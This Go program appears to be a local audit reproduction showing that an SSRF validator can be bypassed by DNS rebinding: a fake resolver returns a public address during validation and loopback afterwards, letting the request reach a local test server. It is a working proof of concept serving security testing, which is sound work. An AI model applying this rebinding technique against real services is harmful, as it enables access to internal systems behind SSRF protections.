package main

import (
	"context"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"strconv"
	"sync/atomic"
	"time"

	"github.com/duanxldragon/pantheon-base/backend/pkg/security/ssrf"
)

// Local-only audit reproduction. A synthetic resolver supplies a public IP
// during validation and loopback during dialing; no external DNS is contacted.
func main() {
	var aLookups atomic.Int32
	var reached atomic.Bool
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		reached.Store(true)
		w.WriteHeader(http.StatusNoContent)
	}))
	defer server.Close()
	_, port, _ := net.SplitHostPort(server.Listener.Addr().String())
	previous := net.DefaultResolver
	defer func() { net.DefaultResolver = previous }()
	net.DefaultResolver = &net.Resolver{PreferGo: true, Dial: func(context.Context, string, string) (net.Conn, error) {
		client, dnsServer := net.Pipe()
		go func() {
			defer dnsServer.Close()
			_ = dnsServer.SetDeadline(time.Now().Add(5 * time.Second))
			for {
				var size [2]byte
				if _, err := io.ReadFull(dnsServer, size[:]); err != nil { return }
				query := make([]byte, binary.BigEndian.Uint16(size[:]))
				if _, err := io.ReadFull(dnsServer, query); err != nil { return }
				if len(query) < 17 { return }
				end := 12
				for end < len(query) && query[end] != 0 { end += 1 + int(query[end]) }
				end += 5 // root label + QTYPE + QCLASS
				if end > len(query) { return }
				qtype := binary.BigEndian.Uint16(query[end-4:end-2])
				response := append([]byte(nil), query[:end]...)
				binary.BigEndian.PutUint16(response[2:4], 0x8180)
				binary.BigEndian.PutUint16(response[6:8], 0)
				binary.BigEndian.PutUint16(response[8:10], 0)
				binary.BigEndian.PutUint16(response[10:12], 0)
				if qtype == 1 {
					ip := []byte{93, 184, 216, 34}
					if aLookups.Add(1) > 2 { ip = []byte{127, 0, 0, 1} }
					binary.BigEndian.PutUint16(response[6:8], 1)
					response = append(response, 0xc0, 0x0c, 0, 1, 0, 1, 0, 0, 0, 0, 0, 4)
					response = append(response, ip...)
				}
				binary.BigEndian.PutUint16(size[:], uint16(len(response)))
				if _, err := dnsServer.Write(append(size[:], response...)); err != nil { return }
			}
		}()
		return client, nil
	}}
	validator := ssrf.DefaultValidator()
	fixturePort, err := strconv.Atoi(port)
	if err != nil { panic(err) }
	// Permit only this fixture's port/domain. Private-IP and rebinding
	// protection remain enabled; the URL follows the Ops validation sequence.
	validator.AllowedPorts = []int{fixturePort}
	validator.AllowedDomains = []string{"rebinding.audit.test"}
	requestURL := "http://rebinding.audit.test:" + port + "/audit"
	if err := validator.ValidateURL(requestURL); err != nil { panic(err) }
	client := validator.CreateHTTPClient(5 * time.Second)
	response, err := client.Get(requestURL)
	if response != nil { response.Body.Close() }
	fmt.Printf("A lookups=%d; private local endpoint reached=%v; error=%v\n", aLookups.Load(), reached.Load(), err)
	if !reached.Load() { panic("reproduction did not reach the controlled local endpoint") }
}
